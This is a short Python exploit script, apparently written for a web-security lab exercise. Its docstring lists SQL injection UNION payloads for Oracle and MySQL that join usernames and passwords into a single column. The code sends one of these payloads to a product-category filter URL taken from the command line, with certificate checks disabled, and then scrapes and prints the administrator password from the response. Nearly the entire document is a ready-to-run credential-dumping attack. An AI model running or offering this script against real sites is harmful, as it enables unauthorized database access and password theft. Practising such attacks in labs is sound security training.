"""
sqli union attack retrieving multiple values in a single column 

for oracle 
' UNION SELECT username || '~' || password FROM users--

for sql 
' UNION SELECT CONCAT(username,'~',password) FROM users--
' UNION SELECT CONCAT_WS('~',username,password) FROM users--
CONCAT_WS('~',username,password)
The WS means “with separator”.


' UNION SELECT NULL,username||':'||password FROM users--
"""
import requests 
import sys 
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Pets'
    sql_payload = "' UNION SELECT NULL,username||':'||password FROM users--"
    r = requests.get(url + path + sql_payload, verify=False)
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator password...")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.find(text=re.compile('.*administrator.*')).split(":")[1]
        print("[+] The administrator password is '%s'." % admin_password)
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the list of usernames and passwords...")
    if not exploit_sqli_users_table(url):
        print("[-] Did not find an administrator password.")
    